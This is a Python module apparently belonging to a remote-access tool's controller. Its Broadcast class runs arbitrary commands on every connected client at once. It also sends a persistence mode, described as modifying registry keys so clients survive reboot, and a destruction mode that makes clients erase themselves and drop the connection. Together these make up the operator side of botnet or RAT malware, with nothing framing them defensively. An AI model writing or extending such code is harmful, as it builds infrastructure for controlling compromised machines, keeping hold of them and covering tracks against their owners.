import time

from .handler import Handler

from .other import printColor
from .other import XOREncryption
from .other import areYouSure
from .other import printAllTarget
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT

from .management import CheckConn

class Broadcast:

    checker = True

    def __init__(self):
        Broadcast.checker = True #Resets the class attribute each time the constructor is called. 

    def help(self):
        '''-h or --help'''
        printColor("help","""

-h or --help : Displays all session mode commands.

-ls or --list : Displays all clients with their information.

-c : Executes a command on all clients and does not send the result (don't forget to put the command in quotation marks). 

--persistence : Makes all clients persistent at startup by modifying the registry keys.

--destruction : Removes all clients on all clients and cuts connections.

-b or --back : Back to menu.

""") 

    def aSingleRunMod(self): #broadcast
        '''
        Allows you not to send the same modes multiple times on the same machine. 
        This method is very useful for the destroy mode and persistence mode. 
        Once the test is finished it sends a list with all the sockets.

        It is useless, for example, to send the destroy mode twice on the same machine. 
        '''
        
        dict_sorts = {}
        already_dict = False
        copy_dict_conn = Handler.dict_conn
        
        for key in copy_dict_conn.keys():
            #print("\nFirst key-->", key)
            #print("First Value -->", dict_conn[key] )
            
            for key_of_dict_sorts in dict_sorts:
                if(dict_sorts[key_of_dict_sorts][NB_TOKEN] == copy_dict_conn[key][NB_TOKEN]):
                    already_dict = True
                else:
                    pass
            
            if not (already_dict) and copy_dict_conn[key][NB_ALIVE] : #Value already existing and now online
                dict_sorts[key] = copy_dict_conn[key]
                #print(dict_sorts[key][NB_TOKEN])

            already_dict = False #reset 
        
        #print(dict_sorts)
        return dict_sorts
        

    def executeCommand(self,cmd_list):
        '''-c'''
        
        cmd_list.pop(0) #delete "-c"
        
        tmp_cmd = " ".join(cmd_list) #list to string
        cmd = ""

        for char in tmp_cmd: 
            if(char == "\""): #remove "
                pass

            elif(char == " "): #if space
            
                cmd += " "
            else:
            
                cmd += char
        
        self.broadcast_to_all_clients(cmd) #send command for all client
    
    def persistence_to_all_clients(self):
        
        dict_sorts = self.aSingleRunMod()
        
        printColor("information","\n[!] Are you sure you want to run persistence mode on all clients ? \n")    
        
        if(areYouSure()):
            request = "MOD_PERSISTENCE:broadcast"
            for key in dict_sorts.keys():

                if(dict_sorts[key][NB_ALIVE]):
                    if CheckConn().sendsafe(key, dict_sorts[key][NB_SOCKET], request,False): 
                        printColor("information","[+] The persistence was sent to the client number {} {}:{}".format(dict_sorts[key][NB_SESSION], dict_sorts[key][NB_IP], dict_sorts[key][NB_PORT]))

                    else:
                        printColor("information","[-] The persistence could not be sent to: {}:{}".format(dict_sorts[key][NB_IP], dict_sorts[key][NB_PORT]))
                else:
                    pass
            else:
                pass

        

    def destruction_for_all_clients(self):
        #Launches a process (.bat file) to delete the program and then exits the program. 
        
        dict_sorts = self.aSingleRunMod()

        printColor("information","[!] Are you sure you want to run the destruction mode on all customers ? Once the destruction mode is activated, the clients will no longer be accessible.\nIf you are sure of your choice enter Y if not enter N.\n")

        if(areYouSure()):
            request = "MOD_DESTRUCTION:broadcast"
            
            for key in dict_sorts.keys():

                if(dict_sorts[key][NB_ALIVE]):
                    if CheckConn().sendsafe(key, dict_sorts[key][NB_SOCKET], request,False): 
                        printColor("information","[-] Client number {} {}:{} was disconnected.".format(dict_sorts[key][NB_SESSION], dict_sorts[key][NB_IP], dict_sorts[key][NB_PORT]))
                        
                        try:
                            dict_sorts[key][NB_SOCKET].close()
                        except Exception as e:
                            print(e)
                            pass

                        CheckConn().connexionIsDead(key) 

                    else:
                        printColor("information","[+] The command could not be sent to: {}:{}".format(dict_sorts[key][NB_IP], dict_sorts[key][NB_PORT]))
                else:
                    pass
        else:
            pass

        time.sleep(2) #Allows to wait for all connections to end (optional)
        print("\n")

    def disconnection_for_all_clients(self): #coming  soon
        pass

    def broadcast_to_all_clients(self, data, whitout_MOD_ALL=False): 
        '''
        Note:
        Sends an order to all clients. 
        whitout_MOD_ALL=False avoids additional code.
        When it sends persistence to all clients, it does not send "MOD_ALL". 
        With the "broadcast" argument of MOD_PERSISTENCE, the client does not send a response. It simply executes the persistence. 
        '''
            
        request = ""

        if not(whitout_MOD_ALL): 
            request = "MOD_ALL:"+data
        else:
            request = data

        for key in Handler.dict_conn.keys():
            if(Handler.dict_conn[key][NB_ALIVE]):
                if CheckConn().sendsafe(key,Handler.dict_conn[key][NB_SOCKET], request):
                    printColor("information","[+] command sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
                else:
                    printColor("information","[+] The command could not be sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
            else:
                pass


    def main(self):
        if len(Handler.dict_conn) != 0:
            printColor("information","[?] You are in MOD BROADCAST")
            printColor("help","[?] Execute -b or --back to return to sessions mode.\n") 
            
            while Broadcast.checker:
                forall = str(input("broadcast>")).split()
                
                printColor("help","[?] Command execute: {}\n".format(forall))
                
                for i in range(len(forall)):
                    #print(i)
                    try:
                        if(forall[i] == "--back" or forall[i] == "-b"):
                            Broadcast.checker = False #Break Broadcast
                            break
                        
                        elif(forall[i] == "--help" or forall[i] == "-h"):
                            self.help()
                        
                        elif(forall[i] == "--destruction"):
                            self.destruction_for_all_clients()
                        
                        elif(forall[i] == "--persistence"):
                            self.persistence_to_all_clients()
                        
                        elif(forall[i] == "-c"):
                            self.executeCommand(forall)
                        
                        elif(forall[i] == "-ls" or forall[i]=="--list"):
                            printAllTarget()                            

                        else:
                            pass

                    except IndexError:
                        pass


        else:
            printColor("error","[+] No connection is enabled.\n")

